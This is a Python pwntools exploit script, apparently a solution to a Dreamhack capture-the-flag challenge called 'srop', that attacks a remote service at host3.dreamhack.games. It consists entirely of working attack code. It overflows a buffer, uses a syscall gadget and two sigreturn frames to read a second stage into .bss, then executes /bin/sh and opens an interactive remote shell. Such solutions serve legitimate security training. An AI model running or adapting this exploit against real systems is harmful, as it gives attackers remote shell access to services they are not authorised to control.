from pwn import *

port = 14414
rem = remote("host3.dreamhack.games", port)

context.arch = 'x86_64'

elf = ELF("./Pwnable/SigReturn-Oriented Programming/problem/srop")

gadget = next(elf.search(asm('pop rax; syscall')))
bss = elf.bss()
syscall = next(elf.search(asm('syscall')))

frame = SigreturnFrame()
frame.rip = syscall
frame.rax = 0
frame.rsi = bss
frame.rdx = 0x1000
frame.rsp = bss

payload = b'A' * 16
payload += b'B' * 8
payload += p64(gadget)
payload += p64(15)
payload += bytes(frame)

rem.sendline(payload)

frame = SigreturnFrame()
frame.rip = syscall
frame.rax = 0x3b
frame.rdi = bss + 0x108 # payload length
frame.rsp = bss + 0x500 # just some location

payload = p64(gadget)
payload += p64(15)
payload += bytes(frame)
payload += b'/bin/sh\x00'

rem.sendline(payload)
rem.interactive()